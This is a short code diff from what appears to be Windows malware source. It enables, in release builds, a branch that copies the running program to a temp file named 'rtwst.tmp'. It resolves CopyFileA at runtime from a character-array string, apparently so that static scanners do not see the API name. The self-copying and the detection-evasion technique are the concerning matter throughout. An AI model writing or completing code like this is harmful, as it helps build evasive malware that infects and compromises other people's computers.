@@ -318,10 +318,15 @@ WinMain(HINSTANCE hInstance,
 	strncpy_s(newPath, MAX_PATH, tempPath, strlen(tempPath));
 	strncat_s(newPath, "rtwst.tmp", 9);
 
-	if ( 0 ) //strcmp(currentPath, newPath) != 0 )
+#if DEBUG	
+	if ( 0 )
+#else
+	if ( strcmp(currentPath, newPath) != 0 )
+#endif
 	{
 		char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
 		_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);
+
 		if ( f_CopyFileA == NULL )
 		{
 #if DEBUG
